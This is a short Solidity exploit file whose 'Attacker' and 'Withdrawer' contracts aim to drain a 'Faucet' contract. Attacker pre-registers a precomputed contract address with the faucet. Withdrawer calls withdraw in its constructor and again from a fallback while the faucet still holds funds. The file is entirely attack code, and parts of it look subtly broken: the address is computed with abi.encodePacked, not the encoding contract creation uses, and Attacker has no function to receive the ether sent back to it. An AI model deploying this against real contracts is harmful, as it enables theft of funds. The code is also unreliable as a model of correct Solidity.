// SPDX-License-Identifier: MIT
pragma solidity 0.8.0;

interface Faucet {
    function register(address user) external;
    function withdraw() external payable;
}

contract Withdrawer {
    Faucet faucet;

    constructor(address _faucet) {
        faucet = Faucet(_faucet);
        faucet.withdraw();
        payable(msg.sender).transfer(address(this).balance);
    }

    fallback() payable external {
        if (address(faucet).balance != 0) {
            faucet.withdraw();
        }
    }
}

contract Attacker {
    Faucet faucet;
    address payable owner;

    constructor(address _faucet) {
        faucet = Faucet(_faucet);
        owner = payable(msg.sender);
        faucet.register(_getFutureContractAddress());
    }

    function _getFutureContractAddress() internal view returns (address) {
        address deployer = address(this);
        uint256 nonce = 1;
        bytes32 data = keccak256(abi.encodePacked(deployer, nonce));
        return address(uint160(uint256(data)));
    }

    function attack() public {
        new Withdrawer(address(faucet));
        owner.transfer(address(this).balance);
    }
}